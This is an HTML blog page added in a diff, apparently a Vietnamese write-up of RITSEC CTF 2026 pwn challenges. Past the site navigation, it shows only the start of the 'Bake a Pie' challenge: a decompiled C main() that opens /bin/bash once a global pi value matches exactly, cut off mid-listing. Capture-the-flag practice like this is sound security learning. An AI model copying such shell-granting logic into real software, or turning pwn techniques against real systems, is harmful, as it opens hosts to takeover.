@@ -1,0 +1,1655 @@
+<!DOCTYPE html>
+<html lang="en-GB" dir="ltr">
+<head><script src="/my-writeups/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=my-writeups/livereload" data-no-instant defer></script>
+    <!-- head.html --><!-- meta.html -->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WRITE UP RITSEC CTF 2026 | niddalA</title>
+<meta name="author" content="niddalA">
+<meta name="description" content="Writes up Risec CTF 2026 - PWN" >
+<meta name="keywords" content="CTF,Pwn,Risec CTF">
+<link rel="canonical" href="http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/">
+
+
+
+    
+    <!-- twitterCard -->
+    
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="WRITE UP RITSEC CTF 2026 | niddalA" />
+    <meta name="twitter:description" content="Writes up Risec CTF 2026 - PWN" />
+        <meta name="twitter:image" content="https://ctf.ritsec.club/assets/images/ritsec-26_logo.png" />
+    
+    <!-- openGraph -->
+    <meta property="og:title" content="WRITE UP RITSEC CTF 2026 | niddalA" />
+    <meta property="og:description" content="Writes up Risec CTF 2026 - PWN" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="http://localhost:1313/my-writeups/post/risec-ctf-2026/write-up-ritsec-ctf-2026-for-practice/" />
+        <meta property="og:image" content="https://ctf.ritsec.club/assets/images/ritsec-26_logo.png" />
+    <meta property="og:site_name" content="niddalA" />
+    <!-- js.html -->
+            <script src="http://localhost:1313/my-writeups/hugo-brewm.min.js" defer></script><!-- css.html -->
+            <link rel="stylesheet" href="http://localhost:1313/my-writeups/hugo-brewm.min.css">
+
+
+
+    
+    <!-- css/inline.html -->
+    <style>
+         
+        body {max-width: 786px; margin: auto; padding: 2rem;}
+        img {max-width: 86vw;}
+    </style>
+    
+    
+    
+</head>
+<body>
+    <!-- header.html -->
+<header class="pagewidth">
+    <div id="background-header" class="background" aria-hidden="true"></div>
+    
+    <nav aria-label="Bypass">
+        <a id="to-content" href="#content" aria-label="Skip to Main Content">
+            <span>Skip to Main Content</span>
+            <kbd class="key" aria-hidden="true" data-key="c"></kbd>
+            <span class="screening" aria-hidden="true"></span>
+        </a>
+    </nav>
+    
+    <!-- logo.html -->
+    <div id="logo">
+        <a href="http://localhost:1313/my-writeups/" aria-label="niddalA" aria-description="Homepage"><svg id="logotype" xmlns="http://www.w3.org/2000/svg" version="1.1" width="196pt" aria-label="niddalA">
+                        <text id="logotype__text" y="19.5pt" x="0">niddalA</text>
+                    </svg>
+        </a>
+        <hr class="hide"/>
+    </div>
+    
+    <details class="presentation" id="top-nav">
+        <summary class="on-deck">
+            <span class="t">Navigation</span>
+            <span class="menu-icon" role="presentation"></span>
+        </summary>
+        <nav tabindex="-1" aria-label="Top">
+            <!-- menu.html -->
+    <details id="has-main-menu" class="presentation" open>
+        <summary  class="hide"  aria-label="Main Menu">
+            <span>Main Menu</span>
+        </summary>
+            
+            <nav id="main-menu" aria-label="Main Menu">
+                <ul class="l1  " role="presentation" tabindex="-1" >
+                    
+    
+        <li role="presentation" >
+    <details class="presentation js-details" name="on-deck"  >
+        <summary class="anchor  on-deck ">
+            <span >Series</span>
+        </summary>
+        <ul class="l2  on-plank " role="presentation">
+            
+    
+        <li role="presentation" >
+    <a   class=has-desc href=../../../
+            aria-label="A Series"
+            aria-description="Example with post/description"
+
+        >
+        
+            <span>
+                A Series</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Another series</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <details class="presentation js-details"  >
+        <summary class="anchor ">
+            <span  class="has-aria-label" aria-label="Nested Menu example" >Sustainable Development</span>
+        </summary>
+        <ul class="l3 " role="presentation">
+            
+    
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Affordable and Clean Energy</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Clean Water and Sanitation</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Climate Action</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Decent Work and Economic Growth</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Gender Equality</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Good Health and Well-being</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Industry, Innovation and Infrastructure</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Life Below Water</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Life on Land</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                No Poverty</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Partnerships for the Goals</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Peace, Justice and Strong Institutions</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Quality Education</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Reduced Inequalities</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Responsible Consumption and Production</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Sustainable Cities and Communities</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Zero Hunger</span>
+    </a>
+        </li>
+        </ul>
+    </details>
+        </li>
+        </ul><div class="screening js-cpn" role="presentation" aria-hidden="true"></div>
+    </details>
+        </li>
+        <li role="presentation" >
+    <a   class=on-deck href=../../../
+
+        >
+        
+            <span>
+                Projects</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   class=on-deck href=https://github.com/niddalA-sec
+            target="_blank"
+            rel="external noopener noreferrer nofollow"
+
+        >
+        
+            <i class="icon sri">github</i>
+            <span>
+                Github</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <details class="presentation js-details" name="on-deck"  >
+        <summary class="anchor  on-deck ">
+            <span >works</span>
+        </summary>
+        <ul class="l2  on-plank " role="presentation">
+            
+    
+        <li role="presentation" >
+    <a   class=has-desc href=../../../
+            aria-label="Commission"
+            aria-description="Example Menu"
+
+        >
+        
+            <span>
+                Commission</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   class=has-desc href=../../../
+            aria-label="Project"
+            aria-description="My current projects"
+
+        >
+        
+            <span>
+                Project</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   class=has-desc href=../../../
+            aria-label="Gallery"
+            aria-description="Well, actually, silly stuff"
+
+        >
+        
+            <span>
+                Gallery</span>
+    </a>
+        </li>
+        </ul><div class="screening js-cpn" role="presentation" aria-hidden="true"></div>
+    </details>
+        </li>
+                </ul>
+            </nav>
+    </details>
+            <!-- search.html -->
+<details id="has-search" class="presentation js-details" name="on-deck">
+    <summary class="on-deck srm" accesskey="q" aria-labelledby="search-label" aria-keyshortcuts="q">
+        <span id="search-label" class="t srt">Search</span>
+    </summary>
+    
+        <!-- pagefind.html -->
+    <div id="search" class="on-hull">
+        <div role="presentation" class="screening js-cgpn"></div>
+    </div>
+    <script src="../../../pagefind/pagefind-ui.js" type="text/javascript"></script>
+    <script>
+        let pageFindInitialized = false;
+        const initPageFind = function(event) {
+            if (!pageFindInitialized) {
+                new PagefindUI({
+                    element: "#search",
+                    showImages: false,
+                    translations: {
+                        placeholder: "Search"
+                    }
+                });
+                
+                const pFInput = document.querySelector('.pagefind-ui__search-input');
+                if (pFInput) {
+                    pFInput.setAttribute('aria-label', pFInput.getAttribute('placeholder'));
+                    pFInput.setAttribute('name', pFInput.getAttribute('placeholder'));
+                }
+                pageFindInitialized = true;
+                document.removeEventListener('DOMContentLoaded', initPageFind);
+            }
+        };
+        document.addEventListener('DOMContentLoaded', initPageFind);
+    </script>
+        <noscript id="has-search-fallback" class="on-hull">
+                
+    <!-- duckduckgo.html -->
+    <form id="duckduckgo" class="form on-plank"
+        name="[i18n] seach" action="//duckduckgo.com/"
+        role="search" aria-label="Search">
+        <input type="hidden" value="localhost:1313" name="sites"></input>
+        <input type="hidden" value="1" name="kh"></input>
+        <input type="hidden" value="1" name="kn"></input>
+        <input type="hidden" value="1" name="kac"></input>
+        <input class="ldots form__input" type="search" placeholder="Search" name="q" role="searchbox"></input>
+        <button class="form__button" type="submit" aria-label="Search">
+            <img src="https://duckduckgo.com/assets/logo_header.v109.svg" alt="Search" role="presentation" aria-hidden="true">
+        </button>
+    </form>
+    <div role="presentation" class="screening js-cgpn"></div>
+        </noscript>
+    
+</details>
+
+            <!-- menu.html -->
+    <details id="has-more-menu" class="presentation js-details" name="on-deck" >
+        <summary  accesskey="=" class="on-deck srm"  aria-label="More Menu">
+            <span class="t srt">More Menu</span>
+                <span class="menu-icon sri" role="presentation"></span>
+        </summary>
+            <!-- on hull -->
+            <nav id="more-menu" aria-label="More Menu">
+                <ul class="l1  on-plank  " role="presentation" tabindex="-1" >
+                    
+    
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Resources</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <details class="presentation js-details" open >
+        <summary class="anchor ">
+            <span >About</span>
+        </summary>
+        <ul class="l2 " role="presentation">
+            
+    
+        <li role="presentation" >
+    <a   href=../../../
+
+        >
+        
+            <span>
+                Sustainability</span>
+    </a>
+        </li>
+        <li role="presentation" >
+    <a   href=../../../author/
+
+        >
+        
+            <span>
+                Author</span>
+    </a>
+        </li>
+        </ul>
+    </details>
+        </li>
+        <li role="presentation" >
+    <details class="presentation js-details" open >
+        <summary class="anchor ">
+            <span >More Menu</span>
+        </summary>
+        <ul class="l2 " role="presentation">
+            
+    
+        <li role="presentation" >
+    <details class="presentation js-details"  >
+        <summary class="anchor ">
+            <span >That</span>
+        </summary>
+        <ul class="l3 " role="presentation">
+            
+    
+        <li role="presentation" >
+    <details class="presentation js-details"  >
+        <summary class="anchor ">
+            <span >Never</span>
+        </summary>
+        <ul class="l4 " role="presentation">
+            
+    
+        <li role="presentation" >
+    <details class="presentation js-details"  >
+        <summary class="anchor ">
+            <span >Too</span>
+        </summary>
+        <ul class="l5 " role="presentation">
+            
+    
+        <li role="presentation" >
+    <a  
+
+        >
+        
+            <span>
+                Deep</span>
+    </a>
+        </li>
+        </ul>
+    </details>
+        </li>
+        </ul>
+    </details>
+        </li>
+        </ul>
+    </details>
+        </li>
+        </ul>
+    </details>
+        </li>
+                </ul>
+                <div class="screening js-cgpn" role="presentation" aria-hidden="true"></div>
+            </nav>
+    </details>
+            <!-- i18n.html -->
+        <details id="has-i18n" class="presentation js-details srm" name="on-deck">
+                <summary class="anchor on-deck"
+                    aria-label="Language Selections"
+                    aria-description="Current Language is English">
+                    <span class="emoji">🇬🇧&nbsp;</span>
+                    <span class="iso639">EN </span>
+                    <span class="languangeName">English</span>
+                </summary>
+
+            <!-- on hull -->
+            <nav id="i18n-menu" aria-label="Language Selections">
+                <ul class="on-plank">
+                        <li>
+                            <a href="http://localhost:1313/my-writeups/id/" aria-label="Change language to Bahasa Indonesia">
+                                <span class="emoji">🇮🇩&nbsp;</span>
+                                <span class="languangeName">Bahasa Indonesia</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="http://localhost:1313/my-writeups/es-mx/" aria-label="Change language to Español (México)">
+                                <span class="emoji">🇲🇽&nbsp;</span>
+                                <span class="languangeName">Español (México)</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="http://localhost:1313/my-writeups/fr/" aria-label="Change language to French">
+                                <span class="emoji">🇫🇷&nbsp;</span>
+                                <span class="languangeName">French</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="http://localhost:1313/my-writeups/hi/" aria-label="Change language to हिन्दी">
+                                <span class="emoji">🇮🇳&nbsp;</span>
+                                <span class="languangeName">हिन्दी</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="http://localhost:1313/my-writeups/ca/" aria-label="Change language to Català">
+                                <span class="emoji">🇪🇸&nbsp;</span>
+                                <span class="languangeName">Català</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="http://localhost:1313/my-writeups/de/" aria-label="Change language to Deutsch">
+                                <span class="emoji">🇩🇪&nbsp;</span>
+                                <span class="languangeName">Deutsch</span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="http://localhost:1313/my-writeups/es/" aria-label="Change language to Español">
+                                <span class="emoji">🇪🇸&nbsp;</span>
+                                <span class="languangeName">Español</span>
+                            </a>
+                        </li>
+                </ul>
+                <div class="screening js-cgpn" role="presentation" aria-hidden="true"></div>
+            </nav>
+        </details>
+
+        </nav>
+        <div id="top-nav-screen" class="screening js-cpn" role="presentation" aria-hidden="true"></div>
+        <hr class="hide"/>
+    </details>
+</header>
+    
+    <!-- [main] baseof.html -->
+    <main id="page"class="post"
+        >
+        <!-- main/header.html -->
+        <header class="pagewidth">
+                    <menu id="menu" class="srm"
+                        data-i18n-back="Go Back"
+                        data-i18n-print="Print"
+                        data-i18n-copy="Copy URL"
+                        data-i18n-copying="Copying...">
+                                <li>
+                                    <a id="navigatorShare" href="#mastodon" role="button" aria-label="Share">
+                                        <span class="t srt" role="tooltip">Share</span>
+                                    </a>
+                                </li>
+                    </menu>
+            <!-- nav.html -->
+<details class="presentation" aria-expanded="true" id="has-breadcrumb" open>
+    <summary id="breadcrumb" tabindex="-1">
+        <span>Breadcrumb</span>
+    </summary>
+        <nav aria-labelledby="breadcrumb">
+            <ul role="presentation" class="breadcrumb ">
+                    <!-- breadcrumb.html -->
+        <li>
+            <a href="http://localhost:1313/my-writeups/post/" aria-current="true">Post
+            </a>
+        </li>
+    <li>
+        <a href="" aria-current="page" tabindex="-1">WRITE UP RITSEC CTF 2026
+        </a>
+    </li>
+            </ul>
+        </nav>
+</details>
+            <hr class="hide"/>
+        </header>
+        <div id="top" role="presentation">
+            
+        </div>
+        
+        <div id="has-stage" class="section-title pagewidth">
+                        <span class="st evergreen"></span>
+                    <a href="http://localhost:1313/my-writeups/stage/evergreen/" id="stage" aria-label="Stage: evergreen">
+                        <span>evergreen</span>
+                    </a>
+        </div>
+    <article id="main-article" class="pagewidth rm"
+        role="document" aria-labelledby="title"
+            data-pagefind-body>
+        <header aria-labelledby="title">
+            <!-- title.html -->
+        <h1 id="title"
+                data-pagefind-meta="title"
+            data-bionRead-safe
+            >WRITE UP RITSEC CTF 2026</h1>
+            <div id="doc-author" class="textsw">
+                            
+                                <a class="author" href="http://localhost:1313/my-writeups/author/author-name/" aria-label="niddalA">
+                                        <img id="avatar" class="sri" src="../../../images/avatar.jpg" alt="niddalA"/>
+                                        <span class="has-desc" aria-label="niddalA" aria-description="Available for hire">niddalA</span>
+                                </a>
+            </div>
+            <!-- timestamp.html-->
+        <div id="timestamp">
+            <span>Published on</span>
+            <time datetime="2026-04-06T00:00:00&#43;00:00">April 6, 2026</time>,
+            <span>modified on</span>
+            <time datetime="2026-04-17T00:00:00&#43;00:00">April 17, 2026</time>.
+        </div>
+        </header>
+        <!-- audio.html -->
+        <section id="content" class="content " aria-labelledby="title" data-bionRead-safe>
+                <style>
+  /* 1. THU NHỎ AVATAR XUỐNG MỨC TINH TẾ (50px) */
+  /* Nhắm chính xác vào thẻ img của avatar để không bắt nhầm ảnh bài viết */
+  header img, 
+  [class*="author"] img, 
+  img[alt*="niddalA"] {
+    width: 50px !important;    /* Chỉnh số này nếu muốn to/nhỏ hơn tí nữa */
+    height: 50px !important;
+    max-width: 50px !important;
+    border-radius: 50% !important;
+    object-fit: cover !important;
+    display: inline-block !important;
+    vertical-align: middle !important; /* Căn giữa với dòng chữ tên bạn */
+    margin-right: 10px !important;   /* Tạo khoảng cách với tên "niddalA" */
+  }
+
+  /* 2. ĐẢM BẢO CHỮ VẪN TRÀN LỀ ĐẸP */
+  article p, article li {
+    text-indent: 0 !important;
+    max-width: 100% !important;
+    width: 100% !important;
+    text-align: left !important;
+    margin-bottom: 1.2em !important; /* Giãn dòng giữa các đoạn văn cho dễ đọc */
+  }
+
+  /* 3. ẢNH TRONG BÀI VIẾT VẪN TO RÕ RÀNG */
+  .post-content img, section img {
+    width: 100% !important;
+    height: auto !important;
+    display: block;
+    margin: 25px 0 !important;
+  }
+</style>
+<h1 id="write-up-risec-ctf-2026-for-practice">WRITE UP RISEC CTF 2026 (FOR PRACTICE)</h1>
+<p>Credit: <img src="https://hackmd.io/_uploads/Bk0mnieh-g.png" alt="image">
+(Tham khảo bài 2,3,4 - Đã chỉnh sửa lại một số chỗ)</p>
+<h2 id="1-bake-a-pie">1. BAKE A PIE</h2>
+<p><img src="https://hackmd.io/_uploads/rk2V8ix2Wg.png" alt="image"></p>
+<h3 id="phân-tích">PHÂN TÍCH</h3>
+<p>Challenge cho ta một file zip, sau khi extract file ta được một file binary
+SOURCE CODE:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  uint uVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar2;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_29;
+</span></span><span style="display:flex;"><span>  uint local_28;
+</span></span><span style="display:flex;"><span>  uint local_24;
+</span></span><span style="display:flex;"><span>  undefined8 local_20;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_20 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;I want to create the perfect pi recipe, but can</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t quite get it right...&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Can you help me bake the perfect pi?&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">putchar</span>(<span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>( true ) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span>( true ) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;------------------------------------------------------------&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;(S)how recipe, (C)change ingredient, (T)aste test: &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%c%*c&#34;</span>,<span style="color:#f92672">&amp;</span>local_29);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (local_29 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;T&#39;</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (pi <span style="color:#f92672">==</span> <span style="color:#ae81ff">3.141592653589793</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Yummy! This is the perfect pi!&#34;</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">execl</span>(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Still doesn</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t taste right. Let</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s try a different recipe.&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
